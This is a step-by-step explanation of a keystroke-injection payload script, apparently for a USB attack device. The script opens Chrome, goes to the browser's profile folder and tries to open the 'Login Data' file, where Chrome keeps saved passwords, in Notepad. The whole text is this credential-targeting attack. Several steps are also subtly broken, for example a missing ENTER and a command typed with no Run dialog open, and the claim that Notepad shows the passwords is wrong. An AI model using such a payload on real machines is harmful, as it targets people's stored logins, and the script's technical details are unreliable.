This payload script showcases a sequence of automated commands to open Google Chrome, navigate to the profile directory, and attempt to read the "Login Data" file where Chrome stores passwords.


1. **Launching Google Chrome:**
   - `GUI r`: Opens the Run dialog.
   - `STRING chrome.exe`: Types `chrome.exe` to run Google Chrome.
   - `DELAY 1000`: Waits 1 second for Chrome to launch.

2. **Navigating to the Chrome Profile Directory:**
   - `GUI r`: Opens the Run dialog again.
   - `STRING %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default`: Types the path to Chrome's default profile directory.
   - `ENTER`: Opens the specified directory.
   - `DELAY 1000`: Waits 1 second for the directory to open.

3. **Opening the Directory in Explorer:**
   - `STRING explorer`: Opens the Windows Explorer to view the directory.
   - `ENTER`: Confirms the command.
   - `DELAY 1000`: Waits 1 second for the Explorer window to open.

4. **Navigating to the Login Data File:**
   - `STRING %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data`: Types the full path to the Login Data file.
   - `ENTER`: Navigates to the specified file.
   - `DELAY 1000`: Waits 1 second for the file to be accessed.

5. **Reading the Login Data File:**
   - `STRING notepad %USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data`: Opens the Login Data file in Notepad.
   - `ENTER`: Confirms the command.
   - `DELAY 1000`: Waits 1 second for Notepad to open the file.
